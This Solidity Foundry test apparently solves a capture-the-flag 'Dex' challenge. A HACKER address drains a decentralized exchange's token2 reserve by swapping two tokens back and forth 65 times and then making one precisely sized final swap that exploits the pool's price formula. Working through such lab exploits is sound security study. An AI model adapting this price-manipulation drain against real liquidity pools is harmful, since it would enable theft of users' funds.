// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "src/Dex.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract DexTest is Test {
    Dex private dex;
    SwappableToken private token1;
    SwappableToken private token2;
    Token1 private token3;
    address private constant HACKER = address(0x3);

    function setUp() external {
        dex = new Dex();
        token1 = new SwappableToken(address(dex), "Swappable1", "SWTKN1", HACKER); // DEX receives 100 TKN, HACKER receives 10 TKN
        token2 = new SwappableToken(address(dex), "Swappable2", "SWTKN2", HACKER); // DEX receives 100 TKN, HACKER receives 10 TKN
        dex.setTokens(address(token1), address(token2));
        vm.deal(HACKER, 5e18);
        vm.startPrank(HACKER);
    }

    function helper() private view{
        console.log("#DEX#");
        uint bal0 = token1.balanceOf(address(dex));
        uint bal1 = token2.balanceOf(address(dex));
        console.log(bal0, bal1);
    }
    function testHack() external {
        for (uint i=0; i< 65; i++) {
            IERC20(address(token1)).approve(address(dex), 8e18);
            dex.swap(address(token1), address(token2), 8e18);
            IERC20(address(token2)).approve(address(dex), 8e18);
            dex.swap(address(token2), address(token1), 8e18);
           // helper();
        }  
        console.log(IERC20(address(token1)).balanceOf(HACKER));
        IERC20(address(token1)).approve(address(dex), 15890856072927322308);
        dex.swap(address(token1), address(token2), 15890856072927322308);
        assertEq(IERC20(address(token2)).balanceOf(address(dex)), 0);
    }
}

contract Token1 is ERC20 {
    constructor(string memory name, string memory symbol) ERC20(name, symbol){}

    function mint(address account, uint256 amount) external {
        _mint(account, amount);
    }
}